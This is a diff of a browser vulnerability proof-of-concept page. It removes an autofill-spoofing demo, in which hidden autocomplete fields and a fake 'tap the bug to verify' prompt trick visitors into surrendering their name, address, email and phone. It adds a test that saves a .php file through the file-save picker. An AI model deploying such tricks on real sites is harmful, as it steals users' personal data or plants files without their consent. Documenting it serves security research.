@@ -4,95 +4,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Autofill Spoofing Demo</title>
+    <title>Proof of Concept - File Save Test</title>
     <style>
-        input {
-            opacity: 0;
-            width: 0.1px;
-            border: none;
-            pointer-events: none;
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
         }
 
-        option {
-            all: initial;
-            background-color: black;
+        button {
+            padding: 10px 20px;
+            cursor: pointer;
+            margin: 10px;
         }
 
-        select {
-            opacity: 0;
-            pointer-events: none;
-            position: absolute;
-            top: -10px;
-            left: 225px;
-        }
-
-        #autofill-result {
-            background-color: aquamarine;
-            font-size: 1.5rem;
+        #status {
+            margin-top: 20px;
+            font-size: 1.2em;
+            color: red;
         }
     </style>
 </head>
 
 <body>
-    <!-- Group 1 -->
-    <div class="input-group">
-        <div>
-            <span id="quest">Tap the bug to verify</span><input id="autofill-data" name="name" autocomplete="name">
-        </div>
-        <input name="email" autocomplete="email">
-        <input name="address-line1" autocomplete="address-line1">
-        <input name="address-line2" autocomplete="address-line2">
-        <input name="city" autocomplete="address-level2">
-        <input name="state" autocomplete="address-level1">
-        <input name="country-name" autocomplete="country-name">
-        <input name="postal-code" autocomplete="postal-code">
-        <input name="tel" autocomplete="tel">
-    </div>
-
-    <select id="selection">
-        <option>&emsp;&emsp;&emsp;&#128030;&emsp;&emsp;&emsp;</option>
-        <option>&emsp;&emsp;&emsp;&#128031;&emsp;&emsp;&emsp;</option>
-        <option>&emsp;&emsp;&emsp;&#128036;&emsp;&emsp;&emsp;</option>
-        <option>&emsp;&emsp;&emsp;&#128011;&emsp;&emsp;&emsp;</option>
-    </select>
-
-    <center>
-        <pre id="autofill-result">The site requires human verification to proceed. Tap to begin.</pre>
-    </center>
+    <h1>Testing File Save Vulnerability - PHP</h1>
+    <button id="saveFileButton">Save .php File</button>
+    <div id="status"></div>
 
     <script>
-        const inputfill = document.getElementById('autofill-data');
-        const selectpicker = document.getElementById('selection');
-
-        // Handle touch event for iOS
-        function handleTouchStart() {
-            document.getElementById('autofill-result').textContent = "Double-tap the bug to verify";
-            document.getElementById('quest').textContent = "Double-tap the bug to verify";
-            selectpicker.showPicker();
-            setTimeout(() => {
-                inputfill.showPicker();
-            }, 100);
-            document.removeEventListener('touchstart', handleTouchStart);
+        // Function to handle file saving
+        async function saveFile() {
+            try {
+                const options = {
+                    suggestedName: 'example.php', // Suggest a .php file instead of .url
+                    types: [{
+                        description: 'PHP File',
+                        accept: {
+                            'text/plain': ['.php']  // Block save for other files like .txt
+                        }
+                    }]
+                };
+                // Request the file save with .php extension
+                const fileHandle = await window.showSaveFilePicker(options);
+                const writable = await fileHandle.createWritable();
+                await writable.write('<?php echo "This is a malicious PHP script"; ?>'); // Fake PHP content
+                await writable.close();
+                document.getElementById('status').textContent = "File saved as .php!";
+            } catch (err) {
+                document.getElementById('status').textContent = "Error: " + err.message;
+            }
         }
 
-        // Listen for touchstart event (for iOS devices)
-        document.addEventListener('touchstart', handleTouchStart);
-
-        // Capture input fields and show autofill data
-        var inputFields = document.querySelectorAll('.input-group input');
-
-        inputFields.forEach(function (inputField) {
-            inputField.addEventListener('input', function () {
-                var formData = {};
-                inputFields.forEach(function (field) {
-                    formData[field.name] = field.value;
-                });
-
-                // Display the captured data in the result area
-                document.getElementById('autofill-result').textContent = JSON.stringify(formData, null, 2);
-                document.getElementById('quest').textContent = "User Data Captured";
-            });
-        });
+        // Add event listener to the button
+        document.getElementById('saveFileButton').addEventListener('click', saveFile);
     </script>
 </body>
 
